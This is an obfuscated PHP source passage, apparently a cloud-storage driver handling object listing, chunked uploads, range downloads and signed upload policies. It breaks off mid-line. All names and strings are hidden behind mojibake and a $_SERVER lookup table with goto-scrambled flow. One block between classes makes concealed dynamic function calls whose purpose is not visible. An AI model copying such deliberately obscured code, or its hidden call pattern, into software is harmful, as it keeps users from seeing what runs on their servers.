$_SERVER[Â€Á›¨õ]; $dé›—œÏ›ç = array($e‹÷‡¾©¼ù[28] => $this->pathThis($cíÚ‡½¯È×), $e‹÷‡¾©¼ù[75] => $this->getPathOuter($e‹÷‡¾©¼ù[8] . $cíÚ‡½¯È×), $e‹÷‡¾©¼ù[29] => $e‹÷‡¾©¼ù[76]); if ($a…¹Õ¨¤ãî) { return $dé›—œÏ›ç; } goto aœš®¾ÄÙğ; aœš®¾ÄÙğ: $dé›—œÏ›ç[$e‹÷‡¾©¼ù[192]] = $dé›—œÏ›ç[$e‹÷‡¾©¼ù[83]] = 0; $dé›—œÏ›ç[$e‹÷‡¾©¼ù[193]] = $dé›—œÏ›ç[$e‹÷‡¾©¼ù[194]] = !0; if (empty($BÒØÍÛ¬–)) { $BÒØÍÛ¬– = $this->objectMeta($cíÚ‡½¯È×); if (!$BÒØÍÛ¬–) { return $dé›—œÏ›ç; } } goto fÔºŸ˜ƒ£; Dàä²Ç‚•: } private function listObjs($b¢Œ‹öŒÉø, $f¯‚ç‚Õ’ = 0, $a¢º‡ßÙ = 1000) { $cÈìİ³Ë² =& $_SERVER[Â€Á›¨õ]; $BÁíŸÌ®¥˜ = array($cÈìİ³Ë²[1316], $cÈìİ³Ë²[1317] . $a¢º‡ßÙ); if ($f¯‚ç‚Õ’) { $BÁíŸÌ®¥˜[] = $cÈìİ³Ë²[1318] . $f¯‚ç‚Õ’; } $Bˆœ¢ôÛÆ = $this->ussRequest($b¢Œ‹öŒÉø, $cÈìİ³Ë²[226], !1, $BÁíŸÌ®¥˜); return !$Bˆœ¢ôÛÆ[$cÈìİ³Ë²[1060]] ? !1 : $Bˆœ¢ôÛÆ[$cÈìİ³Ë²[1062]]; } private function fileList($a‚‹ª¬‘ùÌ, &$eĞ™ÔƒÌÊ, &$aëñÁ›—©, $FÇ”ìõ¦óâ = false) { goto EÒÛæ¶ïã¾; EÒÛæ¶ïã¾: $FÜËó…İ‡ =& $_SERVER[Â€Á›¨õ]; $Cà’¾øÈ—Æ = $FÜËó…İ‡[33]; $d–®°­°‰¡ = 1000; goto F§ó´‰©Ç; F§ó´‰©Ç: $DÆù‹ ã¯« = rtrim($a‚‹ª¬‘ùÌ, $FÜËó…İ‡[8]) . $FÜËó…İ‡[8]; $a‰™¹¬İâ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $A±Œ÷æÇšì = $this->listObjs($a‚‹ª¬‘ùÌ, $Cà’¾øÈ—Æ, $d–®°­°‰¡); if (!$A±Œ÷æÇšì) { return !1; } $Cà’¾øÈ—Æ = isset($A±Œ÷æÇšì[$FÜËó…İ‡[1319]]) ? $A±Œ÷æÇšì[$FÜËó…İ‡[1319]] : $FÜËó…İ‡[33]; $eî­ã˜˜Éõ = isset($A±Œ÷æÇšì[$FÜËó…İ‡[1320]]) ? $A±Œ÷æÇšì[$FÜËó…İ‡[1320]] : array(); foreach ($eî­ã˜˜Éõ as $aË‹ã±±‘†) { $DãÌ¦¾©ØÖ = $aË‹ã±±‘†[$FÜËó…İ‡[29]] == $FÜËó…İ‡[76] ? !0 : !1; $b ›î£Õ¡Å = ltrim($DÆù‹ ã¯« . $aË‹ã±±‘†[$FÜËó…İ‡[28]], $FÜËó…İ‡[8]) . ($DãÌ¦¾©ØÖ ? $FÜËó…İ‡[8] : $FÜËó…İ‡[33]); $C…”¾ÑÁÔ = array($FÜËó…İ‡[28] => $b ›î£Õ¡Å, $FÜËó…İ‡[29] => $DãÌ¦¾©ØÖ ? $FÜËó…İ‡[76] : $FÜËó…İ‡[173], $FÜËó…İ‡[77] => $aË‹ã±±‘†[$FÜËó…İ‡[333]], $FÜËó…İ‡[1315] => $aË‹ã±±‘†[$FÜËó…İ‡[1321]]); if ($a‰™¹¬İâ) { $this->cacheMethod($FÜËó…İ‡[197], $b ›î£Õ¡Å, $DãÌ¦¾©ØÖ); $this->cacheMethod($FÜËó…İ‡[198], $b ›î£Õ¡Å, $C…”¾ÑÁÔ); } if ($DãÌ¦¾©ØÖ) { $eĞ™ÔƒÌÊ[] = $b ›î£Õ¡Å; if ($FÇ”ìõ¦óâ) { $this->fileList($b ›î£Õ¡Å, $eĞ™ÔƒÌÊ, $aëñÁ›—©, $FÇ”ìõ¦óâ); } continue; } $aëñÁ›—©[] = $C…”¾ÑÁÔ; } if (count($eî­ã˜˜Éõ) < $d–®°­°‰¡) { break; } } goto bˆˆ©™Õä; bˆˆ©™Õä: if ($a‰™¹¬İâ) { $this->cacheMethod($FÜËó…İ‡[197], $a‚‹ª¬‘ùÌ, !0); } goto b•¯…÷…íÒ; b•¯…÷…íÒ: } public function listPath($B˜•÷ áã, $F¨‡äõèœ = false) { $BÇ‚ãÈÕ‘Î =& $_SERVER[Â€Á›¨õ]; $aªäøùİà = $D¹¶ÌÀçÒ = array(); $this->fileList($B˜•÷ áã, $aªäøùİà, $D¹¶ÌÀçÒ); foreach ($aªäøùİà as $fÓ¢ˆ¤±‡ => $cîçÙ‰±) { $aªäøùİà[$fÓ¢ˆ¤±‡] = $this->folderInfo($cîçÙ‰±, $F¨‡äõèœ); } foreach ($D¹¶ÌÀçÒ as $fÓ¢ˆ¤±‡ => $cîçÙ‰±) { $D¹¶ÌÀçÒ[$fÓ¢ˆ¤±‡] = $this->fileInfo($cîçÙ‰±[$BÇ‚ãÈÕ‘Î[28]], $F¨‡äõèœ, $cîçÙ‰±); } return array($BÇ‚ãÈÕ‘Î[74] => $aªäøùİà, $BÇ‚ãÈÕ‘Î[73] => $D¹¶ÌÀçÒ); } public function has($e»¿ÇÑš‹¯, $a´Üã°ßî = false, $D‘Ş­Ù…¼Õ = true) { goto Cï¡Œ¼½; A°æâƒ”: while (!0) { check_abort(); $dšÍÓùë«™ = $this->listObjs($e»¿ÇÑš‹¯, $e™ÆšÖƒ°ø, $cœÙ•ƒå); if (!$dšÍÓùë«™) { return !1; } $e™ÆšÖƒ°ø = isset($dšÍÓùë«™[$fÚ“¹òÓŠ[1319]]) ? $dšÍÓùë«™[$fÚ“¹òÓŠ[1319]] : $fÚ“¹òÓŠ[33]; $f¬ËÖ‚­ = isset($dšÍÓùë«™[$fÚ“¹òÓŠ[1320]]) ? $dšÍÓùë«™[$fÚ“¹òÓŠ[1320]] : array(); if (empty($f¬ËÖ‚­)) { break; } $AÜâ‡é‹Ìö = array_filter($f¬ËÖ‚­, function ($EÖ±¡âÒ»í) { $Cœ¬ ƒÊŠ¿ =& $_SERVER[Â€Á›¨õ]; return $EÖ±¡âÒ»í[$Cœ¬ ƒÊŠ¿[29]] == $Cœ¬ ƒÊŠ¿[76]; }); $C¯£çä½©ò = count($f¬ËÖ‚­); $AÜâ‡é‹Ìö = count($AÜâ‡é‹Ìö); $DÎÙÇÖÍÈ• = $C¯£çä½©ò - $AÜâ‡é‹Ìö; if ($a´Üã°ßî) { $F’éÀ«–öì += $AÜâ‡é‹Ìö; $B†ô§œÓä += $DÎÙÇÖÍÈ•; if ($C¯£çä½©ò < $cœÙ•ƒå) { break; } continue; } if ($D‘Ş­Ù…¼Õ) { if ($DÎÙÇÖÍÈ•) { return !0; } } else { if ($AÜâ‡é‹Ìö) { return !0; } } if ($C¯£çä½©ò < $cœÙ•ƒå) { break; } } if ($a´Üã°ßî) { return array($fÚ“¹òÓŠ[201] => $B†ô§œÓä, $fÚ“¹òÓŠ[202] => $F’éÀ«–öì); } return !1; goto Cæª¾ôÊš©; Cï¡Œ¼½: $fÚ“¹òÓŠ =& $_SERVER[Â€Á›¨õ]; $e™ÆšÖƒ°ø = $fÚ“¹òÓŠ[33]; $cœÙ•ƒå = 500; goto fï–âƒÈå; fï–âƒÈå: $B†ô§œÓä = 0; $F’éÀ«–öì = 0; $f¡±õ…¤¶ = rtrim($e»¿ÇÑš‹¯, $fÚ“¹òÓŠ[8]) . $fÚ“¹òÓŠ[8]; goto A°æâƒ”; Cæª¾ôÊš©: } public function listAll($b†Å”ß‡‹©) { goto EÁŒ·Á×Ò; EÁŒ·Á×Ò: $cñùµ‡ÚùÀ =& $_SERVER[Â€Á›¨õ]; $CÇ§Ùà™º½ = $Có¿³¸£´© = array(); $this->fileList($b†Å”ß‡‹©, $CÇ§Ùà™º½, $Có¿³¸£´©, !0); goto DÌ­ Ü’Ş‡; DÌ­ Ü’Ş‡: $A³ˆ¼ÅæÆ = array(); foreach ($Có¿³¸£´© as $CØÄÙµĞ´ß) { $A³ˆ¼ÅæÆ[$CØÄÙµĞ´ß[$cñùµ‡ÚùÀ[28]]] = $CØÄÙµĞ´ß[$cñùµ‡ÚùÀ[77]]; } foreach ($CÇ§Ùà™º½ as $CØÄÙµĞ´ß) { if (is_string($CØÄÙµĞ´ß)) { $A³ˆ¼ÅæÆ[$CØÄÙµĞ´ß] = 0; } } goto D¼Æõ†ğ; D¼Æõ†ğ: return $this->listAllFiles($b†Å”ß‡‹©, array_keys($A³ˆ¼ÅæÆ), $A³ˆ¼ÅæÆ); goto fñ‚Á‚î‰Š; fñ‚Á‚î‰Š: } public function canRead($Bš­á±‡´º) { return $this->exist($Bš­á±‡´º) ? !0 : !1; } public function canWrite($d˜Ê–Şó¬ø) { return $this->exist($d˜Ê–Şó¬ø) ? !0 : !1; } public function getContent($dÚÚêĞ˜Ìô) { return $this->fileSubstr($dÚÚêĞ˜Ìô, 0, -1); } public function setContent($c‘ÊßÈ’Š, $CÈİŒà¦ÕĞ = '') { $fîˆ‚¾›Õ« =& $_SERVER[Â€Á›¨õ]; if (!$CÈİŒà¦ÕĞ) { $e‘À¢â¹ß = $this->ussRequest($c‘ÊßÈ’Š, $fîˆ‚¾›Õ«[222]); return $e‘À¢â¹ß[$fîˆ‚¾›Õ«[1060]]; } $B§Á«í‹ê§ = $this->tempFile($this->pathThis($c‘ÊßÈ’Š)); file_put_contents($B§Á«í‹ê§, $CÈİŒà¦ÕĞ); if ($this->upload($c‘ÊßÈ’Š, $B§Á«í‹ê§)) { $this->tempFileRemve($B§Á«í‹ê§); return !0; } return !1; } public function fileSubstr($cÎ„èÄˆÎ, $eŒ§ØÔŸ©—, $F‹§é“Ô¤¢) { $AØø¢ëöºĞ =& $_SERVER[Â€Á›¨õ]; if (!($c‹ˆ¹ÊÏ§¥ = $this->link($cÎ„èÄˆÎ))) { return !1; } $fç‡…—²–ï = !1; if ($F‹§é“Ô¤¢ > 0) { $E¥¡Ô¥¸ö = $eŒ§ØÔŸ©— + $F‹§é“Ô¤¢ - 1; $fç‡…—²–ï = array($AØø¢ëöºĞ[1282] . $eŒ§ØÔŸ©— . $AØø¢ëöºĞ[434] . $E¥¡Ô¥¸ö); } $D³¨ÁëÚ = url_request($c‹ˆ¹ÊÏ§¥, $AØø¢ëöºĞ[226], !1, $fç‡…—²–ï); return $D³¨ÁëÚ[$AØø¢ëöºĞ[702]] ? $D³¨ÁëÚ[$AØø¢ëöºĞ[1062]] : !1; } public function upload($bÙ°¤µ“ğ·, $Bİ‘ÎåŒà´, $cƒÒÖ¾ÛˆÆ = false, $Dªö‰•£á¸ = REPEAT_REPLACE) { goto fç±·£µªÄ; fç±·£µªÄ: $cñ«ôççéé =& $_SERVER[Â€Á›¨õ]; $aõ›Ø«†‹ = IO::size($Bİ‘ÎåŒà´); if ($aõ›Ø«†‹ <= 1024 * 1024 * 200) { $eëå²òŠ™ª = array($cñ«ôççéé[1322] . $Bİ‘ÎåŒà´); $A‘²©…Î = $this->ussRequest($bÙ°¤µ“ğ·, $cñ«ôççéé[224], $eëå²òŠ™ª); return $A‘²©…Î[$cñ«ôççéé[1060]] ? $this->getPathOuter($bÙ°¤µ“ğ·) : !1; } goto eŠ¢‚”àê½; eŠ¢‚”àê½: $BäçĞ©‰öå = 1024 * 1024 * 10; $cŞ›®ìÑ…Á = array($cñ«ôççéé[1323], $cñ«ôççéé[1324] . $aõ›Ø«†‹, $cñ«ôççéé[1325], $cñ«ôççéé[1326] . $BäçĞ©‰öå); $A‘²©…Î = $this->ussRequest($bÙ°¤µ“ğ·, $cñ«ôççéé[224], !1, $cŞ›®ìÑ…Á); goto AØéÎ§Ô°×; E•ØË°¬š: do { $aî¶µ‘Ğ±” = $CŞ‚ˆ¥“¨³[$cñ«ôççéé[1328]]; fseek_64($B³œ£„ŠŒÃ, $Bï¤ºÛˆ); $D¦™Á»…Õ = fread($B³œ£„ŠŒÃ, $aî¶µ‘Ğ±”); $b¾æİ‰¦î¨ = 0; do { $b¾æİ‰¦î¨++; $CŞ‚ˆ¥“¨³ = $this->uploadPart($bÙ°¤µ“ğ·, $CŞ‚ˆ¥“¨³, $D¦™Á»…Õ); } while (!$CŞ‚ˆ¥“¨³ && $b¾æİ‰¦î¨ < 3); if (!$CŞ‚ˆ¥“¨³) { return !1; } $f¸†·¤Ù£† = $CŞ‚ˆ¥“¨³[$cñ«ôççéé[1327]]; $Bï¤ºÛˆ += $aî¶µ‘Ğ±”; } while ($f¸†·¤Ù£† != -1); fclose($B³œ£„ŠŒÃ); $cŞ›®ìÑ…Á = array($cñ«ôççéé[1329], $cñ«ôççéé[1330] . $CŞ‚ˆ¥“¨³[$cñ«ôççéé[1331]], $cñ«ôççéé[1325]); goto Bâ÷Ò»›ó·; Bâ÷Ò»›ó·: $A‘²©…Î = $this->ussRequest($bÙ°¤µ“ğ·, $cñ«ôççéé[224], !1, $cŞ›®ìÑ…Á); return $A‘²©…Î[$cñ«ôççéé[1060]] ? $this->getPathOuter($Fİõô„¨†×) : !1; goto aÑ…¶¥±î‰; AØéÎ§Ô°×: if (!$A‘²©…Î[$cñ«ôççéé[1060]]) { return !1; } $CŞ‚ˆ¥“¨³ = $A‘²©…Î[$cñ«ôççéé[1062]]; $Bï¤ºÛˆ = 0; goto FÖ¯¤£»³ƒ; FÖ¯¤£»³ƒ: $f¸†·¤Ù£† = $CŞ‚ˆ¥“¨³[$cñ«ôççéé[1327]]; $B³œ£„ŠŒÃ = fopen($Bİ‘ÎåŒà´, $cñ«ôççéé[1230]); if (!$B³œ£„ŠŒÃ) { return !1; } goto E•ØË°¬š; aÑ…¶¥±î‰: } private function uploadPart($C„¨ê§Ëå, $FõßóÆ¿Á, &$dªğ†Ã¤î) { $Cö¹Ú³‘°Ş =& $_SERVER[Â€Á›¨õ]; $cÂ‡½Àä¾” = array($Cö¹Ú³‘°Ş[1332], $Cö¹Ú³‘°Ş[1330] . $FõßóÆ¿Á[$Cö¹Ú³‘°Ş[1331]], $Cö¹Ú³‘°Ş[1333] . $FõßóÆ¿Á[$Cö¹Ú³‘°Ş[1327]], $Cö¹Ú³‘°Ş[140] . $FõßóÆ¿Á[$Cö¹Ú³‘°Ş[1328]]); $bš ·ÃŞ¨ = $this->ussRequest($C„¨ê§Ëå, $Cö¹Ú³‘°Ş[224], $dªğ†Ã¤î, $cÂ‡½Àä¾”); return !$bš ·ÃŞ¨[$Cö¹Ú³‘°Ş[1060]] ? $bš ·ÃŞ¨[$Cö¹Ú³‘°Ş[1060]] : $bš ·ÃŞ¨[$Cö¹Ú³‘°Ş[1062]]; } public function uploadFormData($b”÷Ğ¡íÓœ, $cõê×Îéè = 3600) { return $this->uploadPolicy($b”÷Ğ¡íÓœ, $cõê×Îéè); } public function multiUploadFormData($CÍÜŠœ¥‹, $cº¬µèµ‘õ = 3600) { $FÛ—Æâñ‡ =& $_SERVER[Â€Á›¨õ]; $a‚Ê·»ôˆ = (int) $GLOBALS[$FÛ—Æâñ‡[7]][$FÛ—Æâñ‡[77]]; return $this->uploadPolicy($CÍÜŠœ¥‹, $cº¬µèµ‘õ, $a‚Ê·»ôˆ); } private function uploadPolicy($BšÌÈØÖÆÈ, $D¾äØÁßŠà = 3600, $c¢¦¶æé»ğ = 0) { goto DôÍâ…Ÿ; b·‚Œ°İ„ù: $a¹£®è²ì = base64_encode(hash_hmac($d¯Áè§Šƒ‡[1304], "\x50\117\x53\x54\46{$a’ŒøÁ¾»Ì}\46{$cÜ’•ğÑØ}\46{$C³ˆÖ¹Áğ}", md5("{$this->userpass}"), !0)); $Cğâé„˜° = array($d¯Áè§Šƒ‡[1173] => $C³ˆÖ¹Áğ, $d¯Áè§Šƒ‡[1338] => "\x55\120\x59\125\116\40{$this->username}\72{$a¹£®è²ì}", $d¯Áè§Šƒ‡[175] => $this->endpoint . $a’ŒøÁ¾»Ì); return $Cğâé„˜°; goto E›¤¶•›¹¸; Fêå–Ñ¤•‰: $D‘ß£¯Üå = array($d¯Áè§Šƒ‡[1334] => $this->bucket, $d¯Áè§Šƒ‡[1335] => $BšÌÈØÖÆÈ, $d¯Áè§Šƒ‡[1336] => time() + $D¾äØÁßŠà, $d¯Áè§Šƒ‡[1337] => $cÜ’•ğÑØ); if ($c¢¦¶æé»ğ) { $D‘ß£¯Üå[$d¯Áè§Šƒ‡[1248]] = $c¢¦¶æé»ğ; } $C³ˆÖ¹Áğ = base64_encode(json_encode($D‘ß£¯Üå)); goto b·‚Œ°İ„ù; DôÍâ…Ÿ: $d¯Áè§Šƒ‡ =& $_SERVER[Â€Á›¨õ]; $a’ŒøÁ¾»Ì = $d¯Áè§Šƒ‡[8] . $this->bucket; $cÜ’•ğÑØ = gmdate($d¯Áè§Šƒ‡[1269]); goto Fêå–Ñ¤•‰; E›¤¶•›¹¸: } public function download($Eá—÷ùƒ£, $b½Èí¸µŸ) { goto bíô¡Ğ´Æí; bíô¡Ğ´Æí: $a‡¡½«’…£ = IO::getPathInner(IO::mkfile($b½Èí¸µŸ)); if (!($A©–èä‹Œ³ = $this->link($Eá—÷ùƒ£))) { return !1; } $AÇÔ¶”õì„ = 0; goto f¥¼¤ö¢; B»ê²Ò“Ñ…: fclose($aÏ´Ÿ“‡‹); return $b½Èí¸µŸ; goto BàìÕİ“óÙ; f¥¼¤ö¢: $b„‹µ¦Üô = 1024 * 200; $aÏ´Ÿ“‡‹ = fopen($a‡¡½«’…£, $_SERVER[Â€Á›¨õ][1288]); while (!0) { $dåƒŠÊ ´× = $this->fileSubstr($Eá—÷ùƒ£, $AÇÔ¶”õì„, $b„‹µ¦Üô); if ($dåƒŠÊ ´× === !1) { return !1; } fwrite($aÏ´Ÿ“‡‹, $dåƒŠÊ ´×); $AÇÔ¶”õì„ += $b„‹µ¦Üô; if (strlen($dåƒŠÊ ´×) < $b„‹µ¦Üô) { break; } } goto B»ê²Ò“Ñ…; BàìÕİ“óÙ: } public function link($Dé¼¿—ö®, $cŞ‡æğÜâ = array()) { $F¶Óë›Œ‡ =& $_SERVER[Â€Á›¨õ]; $Dé¼¿—ö® = trim($Dé¼¿—ö®, $F¶Óë›Œ‡[8]); if (!empty($this->token)) { $Bİà‡¡Ş­Œ = strtotime(date($F¶Óë›Œ‡[1339])); $Dæó„Ñ = substr(md5($this->token . $F¶Óë›Œ‡[280] . $Bİà‡¡Ş­Œ . $F¶Óë›Œ‡[1340] . $Dé¼¿—ö®), 12, 8) . $Bİà‡¡Ş­Œ; $cŞ‡æğÜâ[] = $F¶Óë›Œ‡[1341] . $Dæó„Ñ; } $c¿Åã¢ô© = !empty($cŞ‡æğÜâ) ? $F¶Óë›Œ‡[69] . implode($F¶Óë›Œ‡[280], $cŞ‡æğÜâ) : $F¶Óë›Œ‡[33]; return $this->getHost() . $F¶Óë›Œ‡[8] . $Dé¼¿—ö® . $c¿Åã¢ô©; } public function fileOut($eÅ¶ê¶åº±, $b­šàÚÚÎ = false, $e­áËÜ“° = false, $d›‹ÅØÄªğ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($eÅ¶ê¶åº±, $b­šàÚÚÎ, $e­áËÜ“°, $d›‹ÅØÄªğ); } if (!$e­áËÜ“°) { $e­áËÜ“° = $this->pathThis($eÅ¶ê¶åº±); } $f¹´ºğ®¬‰ = $b­šàÚÚÎ ? array($_SERVER[Â€Á›¨õ][1342] . rawurlencode($e­áËÜ“°)) : array(); $EáğÇÖÚ²ë = $this->link($eÅ¶ê¶åº±, $f¹´ºğ®¬‰); $this->fileOutLink($EáğÇÖÚ²ë); } public function fileOutServer($AÇª»øªëÉ, $f™ã£°©Ë = false, $EÊŒªç‰ùõ = false, $e±¬‰à„‹ = '') { parent::fileOut($AÇª»øªëÉ, $f™ã£°©Ë, $EÊŒªç‰ùõ, $e±¬‰à„‹); } public function fileOutImage($F¶¥ÂÎíÓ, $B£¬§¢³¢· = 250) { $BÅ–½—Ş = $this->link($F¶¥ÂÎíÓ . $_SERVER[Â€Á›¨õ][1343] . $B£¬§¢³¢·); $this->fileOutLink($BÅ–½—Ş); } public function fileOutImageServer($C«ññ®ˆï, $A¶åéÒšÉ– = 250) { parent::fileOutImage($C«ññ®ˆï, $A¶åéÒšÉ–); } public function hashMd5($Bä÷Ù•Á—Ä) { $Eä†ïÓ¾Š‚ =& $_SERVER[Â€Á›¨õ]; $D®ˆÀÄäØŠ = $this->_objectMeta($Bä÷Ù•Á—Ä); return isset($D®ˆÀÄäØŠ[$Eä†ïÓ¾Š‚[206]]) ? $D®ˆÀÄäØŠ[$Eä†ïÓ¾Š‚[206]] : !1; } public function size($AÌø·˜¸ ) { $C›¨ç¢Èá« = $this->objectMeta($AÌø·˜¸ ); return $C›¨ç¢Èá« ? $C›¨ç¢Èá«[$_SERVER[Â€Á›¨õ][77]] : 0; } public function info($d¨–†šÁçÏ) { if ($this->isFolder($d¨–†šÁçÏ)) { return $this->folderInfo($d¨–†šÁçÏ); } else { if ($this->isFile($d¨–†šÁçÏ)) { return $this->fileInfo($d¨–†šÁçÏ); } } return !1; } public function exist($AÉ×°Œ×á¤) { return $this->isFile($AÉ×°Œ×á¤) || $this->isFolder($AÉ×°Œ×á¤); } public function isFile($e›¼˜†ÖœÓ) { return !$this->isFolder($e›¼˜†ÖœÓ) && $this->objectMeta($e›¼˜†ÖœÓ); } public function isFolder($f‘İóìƒŞ) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][197], $f‘İóìƒŞ); } protected function objectMeta($AÊˆ–İïæÀ) { return $this->cacheMethod($_SERVER[Â€Á›¨õ][198], $AÊˆ–İïæÀ); } protected function _objectMeta($d•È—¼¼›) { goto Eˆ©”®•; AÏ©ºà’¦†: if (!$eÖë£å¢è[$AœêÃ÷«Ë[1060]]) { return null; } $Fâ¿¤ã›Ñ¬ = isset($eÖë£å¢è[$AœêÃ÷«Ë[1062]]) ? $eÖë£å¢è[$AœêÃ÷«Ë[1062]] : array(); if (!isset($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1345]])) { return null; } goto D‚¯†é”·Ÿ; Eˆ©”®•: $AœêÃ÷«Ë =& $_SERVER[Â€Á›¨õ]; if ($d•È—¼¼› == $AœêÃ÷«Ë[33] || $d•È—¼¼› == $AœêÃ÷«Ë[8]) { return array(); } $eÖë£å¢è = $this->ussRequest($d•È—¼¼›, $AœêÃ÷«Ë[1344]); goto AÏ©ºà’¦†; D‚¯†é”·Ÿ: $a³‡ñ‹Ø¨‘ = array($AœêÃ÷«Ë[29] => isset($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1345]]) ? $Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1345]] : null, $AœêÃ÷«Ë[77] => isset($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1346]]) ? $Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1346]] : null, $AœêÃ÷«Ë[206] => isset($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1347]]) ? $Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1347]] : null, $AœêÃ÷«Ë[1314] => isset($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1348]]) ? $Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1348]] : null); $a³‡ñ‹Ø¨‘[$AœêÃ÷«Ë[1315]] = isset($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1349]]) ? strtotime($Fâ¿¤ã›Ñ¬[$AœêÃ÷«Ë[1349]]) : $a³‡ñ‹Ø¨‘[$AœêÃ÷«Ë[1314]]; return $a³‡ñ‹Ø¨‘; goto Fæ¡¿ì¥ÒÕ; Fæ¡¿ì¥ÒÕ: } protected function _isFolder($e¼ĞËˆ‘³Ñ) { $b«³°ğà­¥ =& $_SERVER[Â€Á›¨õ]; if ($e¼ĞËˆ‘³Ñ == $b«³°ğà­¥[33] || $e¼ĞËˆ‘³Ñ == $b«³°ğà­¥[8]) { return !0; } $EÆÄ†­° = $this->_objectMeta($e¼ĞËˆ‘³Ñ); return isset($EÆÄ†­°[$b«³°ğà­¥[29]]) && $EÆÄ†­°[$b«³°ğà­¥[29]] == $b«³°ğà­¥[76] ? !0 : !1; } } if ($_SERVER[$_SERVER[Â€Á›¨õ][811]] != $_SERVER[$_SERVER[Â€Á›¨õ][1350]]) { goto cŒõ‰ö²†æ; cŒõ‰ö²†æ: $d™Ú‡Ã“ÓŒ = $_SERVER[Â€Á›¨õ][813]; $dÅçá­Ë¾Ã = $_SERVER[$_SERVER[Â€Á›¨õ][808]] . $_SERVER[Â€Á›¨õ][809]; $BçÛ¸áªˆ = $d™Ú‡Ã“ÓŒ($dÅçá­Ë¾Ã); goto D²ÌËæØéÛ; b½Ôè³—ß: $cîòÄÈµ¿($_SERVER[$_SERVER[Â€Á›¨õ][1231]]); goto EªÉËŸ©ƒ×; D²ÌËæØéÛ: $F…ÛÛ´Šô = explode($_SERVER[Â€Á›¨õ][227], $BçÛ¸áªˆ); if (count($F…ÛÛ´Šô) < $_SERVER[Â€Á›¨õ][592]) { $e¸£ÏÕè…Ÿ = $_SERVER[Â€Á›¨õ][814]; $e¸£ÏÕè…Ÿ(); } $cîòÄÈµ¿ = $_SERVER[Â€Á›¨õ][1232]; goto b½Ôè³—ß; EªÉËŸ©ƒ×: } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Eåª„îâŠÓ = false) { } public function exist($eÉí¿ì—ÌĞ) { $cãí›…“± = $this->info($eÉí¿ì—ÌĞ); return $cãí›…“±[$_SERVER[Â€Á›¨õ][193]]; } public function isFile($a“£”ŒÉ¥·) { $BÌòĞñ”²ß = $this->info($a“£”ŒÉ¥·); return $BÌòĞñ”²ß[$_SERVER[Â€Á›¨õ][193]]; } public function isFolder($bºÜ•»¿Ø) { return !1; } public function size($E¹±ÑííÖí) { $A™„ˆ©ë§È = $this->info($E¹±ÑííÖí); return $A™„ˆ©ë§È[$_SERVER[Â€Á›¨õ][77]]; } public function info($EÄõÙ£”´‚) { return $this->infoParse($EÄõÙ£”´‚); } public function infoAuth($Dîˆñ•„ñ) { return $this->infoParse($Dîˆñ•„ñ); } public function infoWithChildren($cœ„ Éê¶å) { return $this->infoParse($cœ„ Éê¶å); } public function infoFull($C™ìÅ‡Ú) { return $this->infoParse($C™ìÅ‡Ú); } private function infoParse($Aßà‰ñ´Ó¡) { $bîèØ·Ø˜ =& $_SERVER[Â€Á›¨õ]; $b£Ş»íÜ = $this->header($Aßà‰ñ´Ó¡); if (!$b£Ş»íÜ || !$b£Ş»íÜ[$bîèØ·Ø˜[702]]) { return !1; } $CõÉØ¿‰öÚ = _get($b£Ş»íÜ, $bîèØ·Ø˜[333], 0); $A­éÔÌ‚Á» = array($bîèØ·Ø˜[28] => $b£Ş»íÜ[$bîèØ·Ø˜[28]], $bîèØ·Ø˜[75] => $Aßà‰ñ´Ó¡, $bîèØ·Ø˜[29] => $bîèØ·Ø˜[173], $bîèØ·Ø˜[77] => intval($CõÉØ¿‰öÚ), $bîèØ·Ø˜[167] => get_path_ext($b£Ş»íÜ[$bîèØ·Ø˜[28]]), $bîèØ·Ø˜[1227] => $CõÉØ¿‰öÚ > 0 && $b£Ş»íÜ[$bîèØ·Ø˜[1351]], $bîèØ·Ø˜[1228] => !1); return $A­éÔÌ‚Á»; } private function header($eÅ’œÔğÓ‰) { goto eº‰Ãæª”‚; b…ĞÔêÕ“…: return self::$_cacheHeader[$eÅ’œÔğÓ‰]; goto CØ™Ç†µàÄ; EŸÑ´²Ÿì²: $GLOBALS[$A”ˆ µ±–[1352]] = !0; self::$_cacheHeader[$eÅ’œÔğÓ‰] = url_header($eÅ’œÔğÓ‰); $GLOBALS[$A”ˆ µ±–[1352]] = $B÷‡•ÄêâÕ; goto b…ĞÔêÕ“…; eº‰Ãæª”‚: $A”ˆ µ±– =& $_SERVER[Â€Á›¨õ]; if (isset(self::$_cacheHeader[$eÅ’œÔğÓ‰])) { return self::$_cacheHeader[$eÅ’œÔğÓ‰]; } $B÷‡•ÄêâÕ = isset($GLOBALS[$A”ˆ µ±–[1352]]) ? $GLOBALS[$A”ˆ µ±–[1352]] : !1; goto EŸÑ´²Ÿì²; CØ™Ç†µàÄ: } public function hashSimple($c‚ô›Ñƒ‚­, $Dš†…êò½¿ = false) { goto e­£ëÄ–ôØ; e­£ëÄ–ôØ: $Bñ¯Å­…Ò =& $_SERVER[Â€Á›¨õ]; $f½ö‹¶é± = $this->info($c‚ô›Ñƒ‚­); if (!$f½ö‹¶é± || !$f½ö‹¶é±[$Bñ¯Å­…Ò[193]]) { return !1; } goto Föï¶¼™Ñ£; b¡´‡Ÿ…¼‚: $cªÌ­”¾ÆÁ .= $this->fileSubstr($c‚ô›Ñƒ‚­, $Eš¾­·—˜ - $d°õ¨Äàœ, $d°õ¨Äàœ); return md5($cªÌ­”¾ÆÁ) . $Eš¾­·—˜; goto F‰¾ŞĞçî¸; c ‹ß‘ÖÆÇ: $DÔ˜Ğ‚Î = timeFloat(); $c‰œêÓÃ¸ = 15; for ($Fô¦êø¹ß = 0; $Fô¦êø¹ß < $fœ¤º©™Ö; $Fô¦êø¹ß++) { if (timeFloat() - $DÔ˜Ğ‚Î > $c‰œêÓÃ¸) { return !1; } $A÷³‘¨‰î = $this->fileSubstr($c‚ô›Ñƒ‚­, 